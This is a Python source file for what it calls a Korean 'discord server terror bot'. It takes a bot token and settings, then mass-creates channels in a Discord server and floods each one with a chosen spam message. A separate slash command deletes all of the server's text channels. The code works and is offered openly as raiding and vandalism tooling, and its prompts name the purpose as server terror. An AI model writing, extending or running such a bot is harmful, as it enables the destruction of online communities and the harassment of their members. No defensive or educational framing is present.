import discord
import asyncio
from discord.ext import commands
import sys
import re

def gradient_color(text, start_color, end_color):
    def ansi_color(r, g, b):
        return f"\033[38;2;{r};{g};{b}m"

    length = len(text)
    step_r = (end_color[0] - start_color[0]) / length
    step_g = (end_color[1] - start_color[1]) / length
    step_b = (end_color[2] - start_color[2]) / length

    colored_text = ""
    for i in range(length):
        r = int(start_color[0] + step_r * i)
        g = int(start_color[1] + step_g * i)
        b = int(start_color[2] + step_b * i)
        colored_text += ansi_color(r, g, b) + text[i]

    colored_text += "\033[0m"
    return colored_text

def remove_ansi_escape_sequences(text):
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

def print_gradient(text, start_color, end_color):
    colored_text = gradient_color(text, start_color, end_color)
    print(remove_ansi_escape_sequences(colored_text))

# 시작 색상과 끝 색상을 설정합니다.
start_color = (255, 0, 0)  # 빨강
end_color = (0, 0, 255)    # 파랑




# 아스키 아트 출력
print_gradient("==============================================", start_color, end_color)
print_gradient(r""" ____       ____        ______    ______   """, start_color, end_color)
print_gradient(r"""/\  _`\    /\  _`\     /\__  _\  /\__  _\  """, start_color, end_color)
print_gradient(r"""\ \ \/\ \  \ \,\L\_\   \/_/\ \/  \/_/\ \/  """, start_color, end_color)
print_gradient(r""" \ \ \ \ \  \/_\__ \      \ \ \     \ \ \  """, start_color, end_color)
print_gradient(r"""  \ \ \_\ \   /\ \L\ \     \ \ \     \ \ \ """, start_color, end_color)
print_gradient(r"""   \ \____/   \ \____\      \ \_\     \ \_\ """, start_color, end_color)
print_gradient(r"""    \/___/     \/_____/      \/_/      \/_/""", start_color, end_color)
print_gradient("==============================================", start_color, end_color)

uuuu = False

def get_yes_or_no(start_color, end_color):
    global uuuu  # 전역 변수로 지정
    yes = input().strip().lower()
    if yes == "y":
        print_gradient("테러를 시작합니다", start_color, end_color)
        uuuu = True
    elif yes == "n":
        print_gradient("디스코드 서버 테러봇 설정을 종료합니다.", start_color, end_color)
        sys.exit()
    else:
        get_yes_or_no(start_color, end_color)

print_gradient("이 프로그램을 사용하여 사용자의 디스코드 계정 및 모든 문제, 법적 문제, 모든 책임은 이 프로그램을 사용하는 사용자에게 있습니다", start_color, end_color)
print_gradient("WARNING\t도배를 너무 많이 실행하면 디스코드 API에 감지돼 IP가 일시적으로 디스코드에서 정지될 수 있습니다(영구 밴 아님)", start_color, end_color)

print_gradient("당신의 봇 토큰을 입력하세요", start_color, end_color)
bottokin = input(str)
print_gradient("만들어질 채널의 개수를 입력하세요", start_color, end_color)
chcuont = int(input())  # 입력 받는 값의 자료형을 확인하여 수정
print_gradient("도배 메시지를 입력하세요", start_color, end_color)
mes = input(str)
print_gradient("도배 메시지 개수를 입력하세요", start_color, end_color)
mescuont = int(input())  # 입력 받는 값의 자료형을 확인하여 수정
print_gradient("채널 이름을 입력하세요", start_color, end_color)
chname = input(str)

print("\n\n\n\n")
print_gradient("================설정을 확인하세요================", start_color, end_color)
print_gradient(f"봇 토큰 : {bottokin}", start_color, end_color)
print_gradient(f"채널의 개수 : {chcuont}", start_color, end_color)
print_gradient(f"채널의 이름 : {chname}", start_color, end_color)
print_gradient(f"도배 메시지의 개수 : {mescuont}", start_color, end_color)
print_gradient(f"도배 메시지 : {mes}", start_color, end_color)
print_gradient("===============================================\n", start_color, end_color)

print_gradient("맞으면 y를 입력하세요\n 틀리면 n을 입력하세요", start_color, end_color)
get_yes_or_no(start_color, end_color)

bot = commands.Bot(command_prefix='!?', intents=discord.Intents.all())

allload = False

@bot.event
async def on_ready():
    global allload
    if uuuu:
        start_color = (255, 0, 0)  # 빨강
        end_color = (0, 0, 255)    # 파랑
        bot.change_presence(status=discord.Status.online, activity=discord.Game("/도움말"))
        try:
            synced = await bot.tree.sync()
            print_gradient(f"Synced {len(synced)} command(s)", start_color, end_color)
            print_gradient("=============================================================================================", start_color, end_color)
            print_gradient("discord sever terror bot: 커맨드 로드 완료", start_color, end_color)
            print_gradient("=============================================================================================", start_color, end_color)
        except Exception as e:
            print_gradient(str(e), start_color, end_color)
            print_gradient("=============================================================================================", start_color, end_color)
            print_gradient("discord sever terror bot: 커맨드 로드 실패", start_color, end_color)
            print_gradient("=============================================================================================", start_color, end_color)
        print_gradient("=============================================================================================", start_color, end_color)
        print_gradient("discord sever terror bot봇이 성공적으로 실행 되었습니다!", start_color, end_color)
        print_gradient("=============================================================================================", start_color, end_color)
        print_gradient("\nDSTT : 서버 테러가 준비 되었습니다. 테러 하고 싶은 서버에 /시작을 입력해주세요.", start_color, end_color)
        print_gradient("\n=============================================================================================", start_color, end_color)
        print_gradient("notification : 봇이 서버에 들어가 있어야합니다 봇이 없는 서버에서\n\
                       /시작을 입력하면 서버 테러가 실행돼지 않습니다.", start_color, end_color)
        print_gradient("=============================================================================================", start_color, end_color)
        allload = True


@bot.tree.command()
async def 채널삭제(interaction: discord.Interaction):
    # 서버의 모든 텍스트 채널을 가져옵니다.
    channels = interaction.guild.text_channels
    
    # 모든 텍스트 채널을 삭제합니다.
    for channel in channels:
        try:
            await channel.delete()
            print(remove_ansi_escape_sequences(f'채널 {channel.name} 삭제 완료'))
        except:
            print_gradient("=============================================================================================", start_color, end_color)
            print_gradient("ERROR\t채널을 삭제하는중 오류가 발생하였습니다.", start_color, end_color)
            print_gradient("=============================================================================================", start_color, end_color)


@bot.tree.command()
async def 시작(interaction: discord.Interaction):
    global allload
    if allload:
        체널개수 = chcuont
        체널이름 = chname
        도배메시지 = mes
        도배개수 = mescuont
        guild = interaction.guild
        amogus = 0
        cha = []
        await interaction.response.send_message(embed=discord.Embed(title=f"서버테러", description=f"체널개수: {체널개수}\n    채널이름: {체널이름}\n도배개수:{도배개수}\n    도배메시지:{도배메시지}"), ephemeral=True)

        # 채널 생성 병렬 처리
        tasks = [create_channels(guild, 체널이름) for _ in range(체널개수)]
        cha = await asyncio.gather(*tasks)

        print(remove_ansi_escape_sequences(f"{체널개수}개의 체널을 생성하였습니다"))
        print(remove_ansi_escape_sequences(f"{도배개수}개의 도배를 시작합니다"))
        print(remove_ansi_escape_sequences("=============================================="))

        # 생성한 모든 채널에 메시지 보내기 (병렬 처리)
        tasks = [send_messages_with_delay(channel, 도배메시지, 도배개수) for channel in cha]
        await asyncio.gather(*tasks)
        print_gradient("==================================================================================================", start_color, end_color)
        print_gradient("DSTT : 도배 성공\n서버 테러를 성공적으로 끝내였습니다. 다시 실행하려면  디스코드에서 /시작을 입력해주세요", start_color, end_color)
        print_gradient("==================================================================================================", start_color, end_color)

    else:
        await interaction.response.send_message("DSTT : 아직 봇이 실행중 입니다. 나중에 다시 시도해주세요", ephemeral=True)


async def create_channels(guild, name):
    channel = await guild.create_text_channel(name)
    await asyncio.sleep(0.5)  # 채널 생성 간격을 더 짧게 설정
    print_gradient("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n==================================================================================================", start_color, end_color)
    print_gradient(f"DSTT : {guild}서버에 채널을 생성 중입니다", start_color, end_color)
    print_gradient("==================================================================================================", start_color, end_color)
    return channel


async def send_messages_with_delay(channel, message, count):
    for _ in range(count):
        await channel.send(message)
        await asyncio.sleep(1)  # 메시지 보내는 간격을 더 짧게 설정
        print_gradient("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n==================================================================================================", start_color, end_color)
        print_gradient(f"DSTT : {channel}에 도배 메시지를 보내는 중입니다", start_color, end_color)
        print_gradient("==================================================================================================", start_color, end_color)

try:
    bot.run(bottokin)
except Exception as e:
    print(remove_ansi_escape_sequences(f"An error occurred: {e}"))
    print(remove_ansi_escape_sequences("ERROR\tAn error occurred while running the Discord bot.\n\n\n\n"))
    print(remove_ansi_escape_sequences("====================================================================="))
    print(remove_ansi_escape_sequences("ERROR\t디스코드 봇을 실행하는 과정에서 오류가 발생하였습니다.\n\
주로 잘못된 디스코드 봇 토큰을 입력하면 이 오류가 발생합니다."))
    print(remove_ansi_escape_sequences("====================================================================="))
    while True:
        pass


